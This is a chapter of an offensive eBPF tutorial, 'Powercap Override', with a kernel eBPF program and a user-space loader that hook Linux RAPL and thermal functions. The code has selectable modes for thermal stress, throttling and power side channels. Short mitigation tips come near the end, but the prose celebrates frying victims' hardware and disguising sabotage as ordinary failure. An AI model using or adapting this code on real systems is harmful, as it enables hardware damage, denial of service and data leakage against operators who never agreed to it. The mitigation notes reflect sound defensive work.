# Powercap Override: Manipulating System Power Management

**Chapter 13: Act III Begins - Beyond Software, Into Hardware**

Welcome to Act III—the final act of our story. You've mastered software manipulation and system control. Now we're going beyond the digital realm into the physical world. This is where eBPF becomes not just a software attack tool, but a hardware attack tool.

Act III is about pushing boundaries that most people don't even know exist. You're not just attacking software anymore—you're attacking the physical constraints that keep hardware safe and functional.

Modern systems have all sorts of power management features—CPU frequency scaling, thermal throttling, power capping. They're designed to keep your hardware from melting, your battery from dying, and your electricity bill from bankrupting you.

But what if we could override all of that? What if we could make the CPU ignore thermal limits, bypass power caps, and push hardware beyond its intended limits? What if we could turn power management from a safety feature into an attack vector?

This is where you learn that eBPF doesn't just give you control over software—it gives you control over the physical world itself.

```mermaid
%%{init: {"theme": "dark", "flowchart": {"curve": "basis"}, "themeVariables": {"primaryColor": "#007bff", "primaryTextColor": "#fff", "primaryBorderColor": "#007bff", "lineColor": "#F8B229", "secondaryColor": "#006100", "tertiaryColor": "#fff"}} }%%
graph TD
    A[User Process] -->|1. Power Management Request| B[Kernel Powercap Framework]
    C[eBPF Program] -->|2. Hook & Intercept| B
    B -->|3. Power Limit Check| D[Hardware Interface]
    C -->|4. Modify Limits| D
    D -->|5. Altered Power State| E[CPU/Memory/GPU]
    E -->|6. Physical Effects| F[Thermal Issues/Side Channels]
    
    style A fill:#4a235a,stroke:#c39bd3,stroke-width:2px
    style B fill:#1b4f72,stroke:#7fb3d5,stroke-width:2px
    style C fill:#0e6251,stroke:#a3e4d7,stroke-width:2px
    style D fill:#7d3c98,stroke:#d2b4de,stroke-width:2px
    style E fill:#7e5109,stroke:#f5cba7,stroke-width:2px
    style F fill:#a93226,stroke:#f5b7b1,stroke-width:2px
    
    click B "https://www.kernel.org/doc/html/latest/power/powercap/powercap.html" "Powercap Framework Documentation"
    click D "https://www.kernel.org/doc/html/latest/power/intel_rapl.html" "Intel RAPL Documentation"
    click E "https://www.kernel.org/doc/html/latest/power/index.html" "Power Management Documentation"
```



**Why Hardware Safety Just Became Optional**

Here's what most people don't think about: your computer is constantly trying not to kill itself. CPU frequency scaling keeps processors from overheating. Power caps prevent systems from drawing too much current. Thermal throttling saves your hardware from literally melting.

But what happens when those safety mechanisms get bypassed? What happens when you can make a CPU run at full speed even when it's overheating? What happens when you can ignore power limits and draw as much current as you want?

That's where power management attacks get scary. We can cause thermal shutdowns by preventing throttling. We can damage hardware by bypassing safety limits. We can create denial of service by forcing systems into thermal protection mode.

The insidious part is that this looks like hardware failure, not an attack. System logs will show thermal events and power issues, but they won't show that we're the ones causing them. It's like being able to sabotage hardware while making it look like natural failure.
## How We Take Control of the Power Grid

### Understanding the Power Management System

The Linux power management system is like having a smart electrical grid for your computer:
- **RAPL (Running Average Power Limit)**: Intel's fancy power meter and circuit breaker system
- **Power Zones**: Different electrical districts (CPU, RAM, GPU, whole package) with their own limits
- **Thermal Controls**: Emergency shutdown switches that kick in when things get too hot
- **Energy Accounting**: The power company's meter that tracks exactly who's using what

All of this is exposed through kernel interfaces and files under [`/sys/class/powercap/`](https://www.kernel.org/doc/Documentation/power/powercap/powercap.txt) where we can read and manipulate power settings.

```
┌─────────────────────────────────────────────────────────────┐
│                      User Space                             │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Power         │      │ Monitoring    │                   │
│  │ Management    │      │ Tools         │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
└──────────┼──────────────────────┼───────────────────────────┘
           │                      │
┌──────────▼──────────────────────▼───────────────────────────┐
│                      Kernel Space                           │
│                                                             │
│  ┌───────────────┐                                          │
│  │ Powercap      │                                          │
│  │ Framework     │                                          │
│  └───────┬───────┘                                          │
│          │                                                  │
│  ┌───────▼───────┐      ┌───────────────┐                   │
│  │ RAPL Driver   │      │ Thermal       │                   │
│  │               │      │ Framework     │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
│  ┌───────▼──────────────────────▼───────┐                   │
│  │           Hardware Interface         │                   │
│  └──────────────────┬───────────────────┘                   │
│                     │                                       │
└─────────────────────┼───────────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────────┐
│                      Hardware                               │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ CPU Package   │      │ DRAM          │                   │
│  └───────────────┘      └───────────────┘                   │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ GPU           │      │ Thermal       │                   │
│  │               │      │ Sensors       │                   │
│  └───────────────┘      └───────────────┘                   │
└─────────────────────────────────────────────────────────────┘
```

Here's what happens when we use eBPF to mess with the power management system:

```
┌─────────────────────────────────────────────────────────────┐
│                      User Space                             │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Power         │      │ Monitoring    │                   │
│  │ Management    │      │ Tools         │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
└──────────┼──────────────────────┼───────────────────────────┘
           │                      │
┌──────────▼──────────────────────▼───────────────────────────┐
│                      Kernel Space                           │
│                                                             │
│  ┌───────────────┐                                          │
│  │ Powercap      │◀─────┐                                   │
│  │ Framework     │      │                                   │
│  └───────┬───────┘      │                                   │
│          │              │                                   │
│  ┌───────┴───────┐      │                                   │
│  │ eBPF Program  │──────┘                                   │
│  └───────────────┘                                          │
│          │                                                  │
│  ┌───────▼───────┐      ┌───────────────┐                   │
│  │ RAPL Driver   │      │ Thermal       │                   │
│  │               │◀─────┼───────────────┤ Framework         │
│  └───────┬───────┘      │               │                   │
│          │              └───────────────┘                   │
│  ┌───────▼──────────────────────────────┐                   │
│  │           Hardware Interface         │                   │
│  └──────────────────┬───────────────────┘                   │
│                     │                                       │
└─────────────────────┼───────────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────────┐
│                      Hardware                               │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ CPU Package   │      │ DRAM          │                   │
│  │ (Overheating) │      │               │                   │
│  └───────────────┘      └───────────────┘                   │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ GPU           │      │ Thermal       │                   │
│  │               │      │ Sensors       │                   │
│  └───────────────┘      └───────────────┘                   │
└─────────────────────────────────────────────────────────────┘
```

### How We Become the Power Company

Our strategy is to take control of the system's power management and make it do our bidding:

1. **Hook the Power Controllers**: We attach to functions like [`rapl_write_power_limit()`](https://elixir.bootlin.com/linux/latest/source/drivers/powercap/intel_rapl_common.c) that set power limits
2. **Rewrite the Power Rules**: We change maximum and minimum power limits for different components
3. **Disable Safety Systems**: We prevent the system from throttling when things get too hot
4. **Build Power Covert Channels**: We manipulate power states to leak information through power consumption patterns
5. **Sabotage Performance**: We artificially limit power to critical components to slow down the system

The scary part is that this looks like hardware failure, not an attack. System logs will show thermal events and power issues, but they won't show that we're the ones causing them.

### Building Our Power Manipulation Tool

```c
// @interactive: true
// @copyable: true
// Powercap Override - eBPF exploitation proof of concept
// This demonstrates manipulating power management for attacks

#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <linux/version.h>
#include <linux/powercap.h>

char LICENSE[] SEC("license") = "GPL";

// Configuration
#define ZONE_NAME_LEN 32
#define MAX_POWER_ZONES 16
#define MAX_CONSTRAINTS 8
#define MAX_COMM_LEN 16

// Attack modes
#define ATTACK_NONE 0
#define ATTACK_THERMAL_STRESS 1
#define ATTACK_THROTTLE 2
#define ATTACK_SIDE_CHANNEL 3

// Structure to track power events
struct power_event {
    u32 pid;                // Process ID
    u8 comm[MAX_COMM_LEN];  // Command name
    u64 timestamp;          // Event timestamp
    u8 zone_name[ZONE_NAME_LEN]; // Power zone name
    u64 original_limit;     // Original power limit
    u64 modified_limit;     // Modified power limit
    u32 constraint_index;   // Constraint index
    u32 attack_mode;        // Current attack mode
};

// Structure to track energy readings for side channels
struct energy_data {
    u64 timestamp;          // When the reading was taken
    u64 energy;             // Energy reading
    u32 pid;                // Process ID that triggered the reading
    u8 zone_name[ZONE_NAME_LEN]; // Power zone name
};

// Map to store power zone information
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, ZONE_NAME_LEN);  // Zone name as key
    __uint(value_size, sizeof(void *)); // Pointer to zone
    __uint(max_entries, MAX_POWER_ZONES);
} power_zones SEC(".maps");

// Map to store original power limits
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(u64));  // Zone pointer as key
    __uint(value_size, sizeof(u64) * MAX_CONSTRAINTS); // Original limits
    __uint(max_entries, MAX_POWER_ZONES);
} original_limits SEC(".maps");

// Map to store energy readings for side-channel analysis
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(key_size, sizeof(u32));
    __uint(value_size, sizeof(struct energy_data));
    __uint(max_entries, 1024);
} energy_readings SEC(".maps");

// Map to track processes we want to monitor
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(u32));  // PID as key
    __uint(value_size, sizeof(u8)); // Flag (1 = target)
    __uint(max_entries, 1024);
} target_processes SEC(".maps");

// Map to store the current attack mode
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(key_size, sizeof(u32));
    __uint(value_size, sizeof(u32));
    __uint(max_entries, 1);
} attack_mode SEC(".maps");

// Map to store side-channel data
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(key_size, sizeof(u32));
    __uint(value_size, sizeof(u64));
    __uint(max_entries, 256);
} side_channel_data SEC(".maps");

// Perf event output for logging
struct {
    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
    __uint(key_size, sizeof(int));
    __uint(value_size, sizeof(int));
    __uint(max_entries, 1024);
} events SEC(".maps");

// Helper function to check if a process is one we want to monitor
static __always_inline bool is_target_process(u32 pid) {
    // Check if this PID is in our tracking map
    u8 *target = bpf_map_lookup_elem(&target_processes, &pid);
    if (target && *target == 1)
        return true;
    
    return false;
}

// Helper function to get the current attack mode
static __always_inline u32 get_attack_mode(void) {
    u32 key = 0;
    u32 *mode = bpf_map_lookup_elem(&attack_mode, &key);
    
    if (mode)
        return *mode;
    
    return ATTACK_NONE;
}

// Helper function to check if a specific attack mode is active
static __always_inline bool is_attack_mode(u32 mode) {
    return get_attack_mode() == mode;
}

// Helper function to create a power limit for side-channel attacks
static __always_inline u64 create_side_channel_limit(u64 original_limit) {
    // In a real side-channel attack, this would encode sensitive data
    // into power limit variations
    
    // For demonstration, we'll just alternate between high and low limits
    u64 timestamp = bpf_ktime_get_ns();
    u32 key = timestamp % 256;
    u64 *data = bpf_map_lookup_elem(&side_channel_data, &key);
    
    if (data && *data) {
        // Encode a '1' bit by increasing the power limit
        return original_limit * 120 / 100;  // 120% of original
    } else {
        // Encode a '0' bit by decreasing the power limit
        return original_limit * 80 / 100;   // 80% of original
    }
}
// Hook the power limit writing function
SEC("kprobe/rapl_write_power_limit")
int BPF_KPROBE(hook_power_limit, struct powercap_zone *zone,
               u64 power_limit, int constraint_index)
{
    // Get zone information
    char name[ZONE_NAME_LEN] = {0};
    bpf_probe_read_str(name, sizeof(name), zone->name);
    
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Store the original power limit
    u64 zone_ptr = (u64)zone;
    u64 *limits = bpf_map_lookup_elem(&original_limits, &zone_ptr);
    if (!limits) {
        // First time seeing this zone, create an entry
        u64 new_limits[MAX_CONSTRAINTS] = {0};
        if (constraint_index >= 0 && constraint_index < MAX_CONSTRAINTS) {
            new_limits[constraint_index] = power_limit;
        }
        bpf_map_update_elem(&original_limits, &zone_ptr, &new_limits, BPF_ANY);
        
        // Also store the zone for later reference
        bpf_map_update_elem(&power_zones, name, &zone, BPF_ANY);
    } else if (constraint_index >= 0 && constraint_index < MAX_CONSTRAINTS) {
        // Update the stored original limit
        limits[constraint_index] = power_limit;
    }
    
    // Check if we should modify this power limit
    u32 current_mode = get_attack_mode();
    u64 modified_limit = power_limit;
    
    if (current_mode != ATTACK_NONE) {
        // Determine which zone this is and apply appropriate modifications
        
        // CPU package power zone
        if (bpf_strncmp(name, "package", 7) == 0) {
            if (current_mode == ATTACK_THERMAL_STRESS) {
                // Remove power limits to cause thermal stress
                modified_limit = 0xFFFFFFFFFFFFFFFF;  // Effectively unlimited
            } else if (current_mode == ATTACK_THROTTLE) {
                // Set very low power limit to cause throttling
                modified_limit = power_limit / 4;  // 25% of normal
            } else if (current_mode == ATTACK_SIDE_CHANNEL) {
                // Manipulate power limit based on side-channel data
                modified_limit = create_side_channel_limit(power_limit);
            }
        }
        // DRAM power zone
        else if (bpf_strncmp(name, "dram", 4) == 0) {
            if (current_mode == ATTACK_THERMAL_STRESS) {
                // Increase DRAM power limit
                modified_limit = power_limit * 2;  // Double the limit
            } else if (current_mode == ATTACK_THROTTLE) {
                // Decrease DRAM power limit
                modified_limit = power_limit / 2;  // Half the limit
            }
        }
        // GPU power zone (if available)
        else if (bpf_strncmp(name, "gpu", 3) == 0) {
            if (current_mode == ATTACK_THERMAL_STRESS) {
                // Increase GPU power limit
                modified_limit = power_limit * 2;  // Double the limit
            } else if (current_mode == ATTACK_THROTTLE) {
                // Decrease GPU power limit significantly
                modified_limit = power_limit / 8;  // 12.5% of normal
            }
        }
        
        // Log the event
        struct power_event event = {};
        event.pid = pid;
        bpf_get_current_comm(&event.comm, sizeof(event.comm));
        event.timestamp = bpf_ktime_get_ns();
        __builtin_memcpy(event.zone_name, name, ZONE_NAME_LEN);
        event.original_limit = power_limit;
        event.modified_limit = modified_limit;
        event.constraint_index = constraint_index;
        event.attack_mode = current_mode;
        
        // Send event to user space
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
        
        // In a real exploit, we would modify the power_limit parameter
        // This is simplified for demonstration
        // bpf_probe_write_user(&power_limit, &modified_limit, sizeof(modified_limit));
    }
    
    return 0;
}

// Hook the energy reading function for side-channel attacks
SEC("kprobe/rapl_read_energy")
int BPF_KPROBE(hook_energy_read, struct powercap_zone *zone, u64 *energy)
{
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Check if this is a process we want to monitor
    if (is_target_process(pid) || is_attack_mode(ATTACK_SIDE_CHANNEL)) {
        // Get zone information
        char name[ZONE_NAME_LEN] = {0};
        bpf_probe_read_str(name, sizeof(name), zone->name);
        
        // Read the energy value
        u64 energy_val = 0;
        bpf_probe_read_kernel(&energy_val, sizeof(energy_val), energy);
        
        // Store the energy reading for side-channel analysis
        u32 idx = bpf_ktime_get_ns() % 1024;
        struct energy_data data = {
            .timestamp = bpf_ktime_get_ns(),
            .energy = energy_val,
            .pid = pid
        };
        __builtin_memcpy(data.zone_name, name, ZONE_NAME_LEN);
        
        bpf_map_update_elem(&energy_readings, &idx, &data, BPF_ANY);
    }
    
    return 0;
}

// Hook the thermal throttling function to bypass it
SEC("kprobe/thermal_zone_trip_update")
int BPF_KPROBE(hook_thermal_throttle, struct thermal_zone_device *tz, int trip)
{
    // Check if we're in thermal stress attack mode
    if (is_attack_mode(ATTACK_THERMAL_STRESS)) {
        // In a real exploit, we would prevent thermal throttling
        // by returning early or modifying the trip point
        
        // Log the event
        struct power_event event = {};
        event.pid = bpf_get_current_pid_tgid() >> 32;
        bpf_get_current_comm(&event.comm, sizeof(event.comm));
        event.timestamp = bpf_ktime_get_ns();
        event.attack_mode = ATTACK_THERMAL_STRESS;
        
        // Send event to user space
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
        
        // For demonstration, we'll just log that we would bypass throttling
        // In a real exploit, we might return 1 here to skip the throttling
    }
    
    return 0;
}
```
### User-Space Control Program

```c
// @interactive: true
// @copyable: true
// User-space program to load and control the Powercap Override eBPF program

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include "powercap_override.skel.h"

static volatile bool exiting = false;

// Structure for power events (must match the BPF version)
struct power_event {
    uint32_t pid;
    uint8_t comm[16];
    uint64_t timestamp;
    uint8_t zone_name[32];
    uint64_t original_limit;
    uint64_t modified_limit;
    uint32_t constraint_index;
    uint32_t attack_mode;
};

// Structure for energy data (must match the BPF version)
struct energy_data {
    uint64_t timestamp;
    uint64_t energy;
    uint32_t pid;
    uint8_t zone_name[32];
};

// Attack mode names
const char *attack_mode_names[] = {
    "None",
    "Thermal Stress",
    "Throttling",
    "Side-Channel"
};

// Handle events from the eBPF program
void handle_event(void *ctx, int cpu, void *data, unsigned int data_sz)
{
    struct power_event *e = data;
    char timestamp[32];
    time_t t = e->timestamp / 1000000000;
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&t));
    
    printf("[%s] Process %d (%s) ", timestamp, e->pid, e->comm);
    
    if (e->zone_name[0] != '\0') {
        printf("power zone '%s' constraint %d: ", e->zone_name, e->constraint_index);
        printf("limit changed from %lu to %lu\n", e->original_limit, e->modified_limit);
    } else {
        printf("thermal event in attack mode: %s\n", 
               attack_mode_names[e->attack_mode]);
    }
    
    printf("  Attack mode: %s\n", attack_mode_names[e->attack_mode]);
    
    if (e->original_limit != e->modified_limit) {
        double change_pct = ((double)e->modified_limit / e->original_limit) * 100.0 - 100.0;
        printf("  Limit change: %.1f%%\n", change_pct);
    }
    
    printf("\n");
}

// Set the attack mode
void set_attack_mode(int map_fd, int mode)
{
    uint32_t key = 0;
    uint32_t value = mode;
    
    if (bpf_map_update_elem(map_fd, &key, &value, BPF_ANY) != 0) {
        fprintf(stderr, "Failed to set attack mode: %s\n", strerror(errno));
    } else {
        printf("Attack mode set to: %s\n", attack_mode_names[mode]);
    }
}

// Add a process to the target list
void add_target_process(int map_fd, int pid)
{
    uint32_t key = pid;
    uint8_t value = 1;
    
    if (bpf_map_update_elem(map_fd, &key, &value, BPF_ANY) != 0) {
        fprintf(stderr, "Failed to add target process: %s\n", strerror(errno));
    } else {
        printf("Added PID %d to target list\n", pid);
    }
}

// Analyze energy readings for side-channel data
void analyze_energy_readings(int map_fd)
{
    struct energy_data data;
    uint32_t key;
    
    printf("\n=== ENERGY READINGS ANALYSIS ===\n\n");
    
    // Simple statistical analysis
    uint64_t min_energy = UINT64_MAX;
    uint64_t max_energy = 0;
    uint64_t total_energy = 0;
    int count = 0;
    
    for (key = 0; key < 1024; key++) {
        if (bpf_map_lookup_elem(map_fd, &key, &data) == 0) {
            if (data.energy == 0)
                continue;
                
            printf("Zone '%s': %lu energy units (PID %u)\n", 
                   data.zone_name, data.energy, data.pid);
            
            if (data.energy < min_energy)
                min_energy = data.energy;
                
            if (data.energy > max_energy)
                max_energy = data.energy;
                
            total_energy += data.energy;
            count++;
        }
    }
    
    if (count > 0) {
        printf("\nStatistics:\n");
        printf("  Min: %lu energy units\n", min_energy);
        printf("  Max: %lu energy units\n", max_energy);
        printf("  Avg: %lu energy units\n", total_energy / count);
        printf("  Samples: %d\n", count);
        printf("  Range: %lu energy units\n", max_energy - min_energy);
    }
}

static void sig_handler(int sig)
{
    exiting = true;
}

void print_usage(const char *prog)
{
    printf("Usage: %s [options]\n", prog);
    printf("Options:\n");
    printf("  -m MODE   Set attack mode (0=none, 1=thermal, 2=throttle, 3=side-channel)\n");
    printf("  -p PID    Add PID to target list for monitoring\n");
    printf("  -h        Show this help\n");
}

int main(int argc, char **argv)
{
    struct powercap_override_bpf *skel;
    struct perf_buffer *pb = NULL;
    int err, opt;
    int attack_mode = 0;  // Default: no attack
    
    // Parse command line arguments
    while ((opt = getopt(argc, argv, "m:p:h")) != -1) {
        switch (opt) {
            case 'm':
                attack_mode = atoi(optarg);
                break;
            case 'p':
                // We'll add PIDs after loading the program
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }

    // Set up signal handler
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    // Increase resource limits
    struct rlimit rlim = {
        .rlim_cur = RLIM_INFINITY,
        .rlim_max = RLIM_INFINITY
    };
    setrlimit(RLIMIT_MEMLOCK, &rlim);

    // Load and verify BPF program
    skel = powercap_override_bpf__open_and_load();
    if (!skel) {
        fprintf(stderr, "Failed to open and load BPF skeleton\n");
        return 1;
    }

    // Attach BPF programs
    err = powercap_override_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF skeleton: %d\n", err);
        goto cleanup;
    }

    // Set up perf buffer for events
    pb = perf_buffer__new(bpf_map__fd(skel->maps.events), 64, handle_event, NULL, NULL, NULL);
    if (!pb) {
        err = -1;
        fprintf(stderr, "Failed to create perf buffer\n");
        goto cleanup;
    }

    // Set attack mode
    set_attack_mode(bpf_map__fd(skel->maps.attack_mode), attack_mode);
    
    // Add target PIDs if specified
    optind = 1;  // Reset getopt
    while ((opt = getopt(argc, argv, "m:p:h")) != -1) {
        if (opt == 'p') {
            int pid = atoi(optarg);
            add_target_process(bpf_map__fd(skel->maps.target_processes), pid);
        }
    }

    printf("Powercap Override eBPF program loaded and running.\n");
    printf("Monitoring power management operations...\n");
    printf("Press Ctrl+C to exit and analyze energy readings.\n\n");

    // Main loop
    while (!exiting) {
        err = perf_buffer__poll(pb, 100);
        if (err < 0 && err != -EINTR) {
            fprintf(stderr, "Error polling perf buffer: %d\n", err);
            goto cleanup;
        }
    }

    // Analyze energy readings if in side-channel mode
    if (attack_mode == 3) {
        analyze_energy_readings(bpf_map__fd(skel->maps.energy_readings));
    }

cleanup:
    perf_buffer__free(pb);
    powercap_override_bpf__destroy(skel);
    return err < 0 ? -err : 0;
}
```

### Mitigation Strategies

1. **Restrict eBPF Capabilities**:
   ```bash
   # Remove CAP_BPF from container
   docker run --cap-drop=bpf --security-opt no-new-privileges ...
   
   # In Kubernetes
   securityContext:
     capabilities:
       drop:
         - BPF
         - SYS_ADMIN
   ```

2. **Implement BPF LSM Policies**:
   ```c
   // Example BPF LSM policy to restrict BPF program loading
   SEC("lsm/bpf")
   int BPF_PROG(restrict_bpf, int cmd, union bpf_attr *attr, unsigned int size) {
       // Only allow specific signing keys or programs from trusted paths
       if (bpf_get_current_uid_gid() >> 32 != 0) {
           return -EPERM;
       }
       return 0;
   }
   ```

3. **Use Hardware-Level Power Monitoring**:
   ```bash
   # Monitor power consumption with external tools
   ipmitool sdr list | grep -i power
   
   # Use Intel RAPL directly from userspace
   rapl-read -p 0 -d 0 -c 0
   
   # Set up external power monitoring
   powerstat -d 0 -c 10
   ```

4. **Implement External Thermal Monitoring**:
   ```bash
   # Monitor temperatures with external tools
   sensors | grep -i temp
   
   # Set up temperature alerts
   sudo apt install lm-sensors
   sudo sensors-detect
   echo "DEVPATH=*/hwmon*/temp1_input, ATTR{temp1_max}=70000" > /etc/udev/rules.d/99-thermal-alert.rules
   ```

### Why This Melts Everything

This powercap override technique is pure hardware destruction:
- **Hardware assassination**: Override thermal protections and literally fry their fucking hardware
- **Infrastructure chaos**: Cause system throttling or complete instability through power manipulation
- **Power side-channel extraction**: Create power-based covert channels to leak sensitive data through energy patterns
- **Economic warfare**: Spike power costs in data centers and make their electricity bills explode
- **Reliability annihilation**: Cause intermittent failures through thermal stress that drives ops teams insane

When you can manipulate power management at the kernel level, you control the physical layer of their infrastructure. Data centers, cloud environments, critical infrastructure - you can literally burn them down from the inside. The beauty is that hardware failures look like normal wear and tear, so your attacks blend into expected operational issues.

### How They'll Try to Catch Us

Smart defenders will be hunting for our power manipulation:
- **eBPF surveillance**: Watching for eBPF programs hooking power management functions
- **Power consumption monitoring**: Looking for discrepancies between configured power limits and actual consumption
- **Thermal anomaly detection**: Monitoring unusual thermal patterns or unexpected throttling behavior
- **Configuration drift detection**: Tracking unexpected changes to power management settings
- **Correlation analysis**: Looking for system instability or performance issues tied to power management changes

But here's the killer advantage - by the time they detect the power manipulation, the physical damage might already be done. Hardware doesn't recover from thermal damage, and proving it was an attack versus normal failure is nearly impossible.

## POC

Companion code: [`ch13-powercap-override`]({{ site.baseurl }}/dBPF-pocs/pocs/ch13-powercap-override/)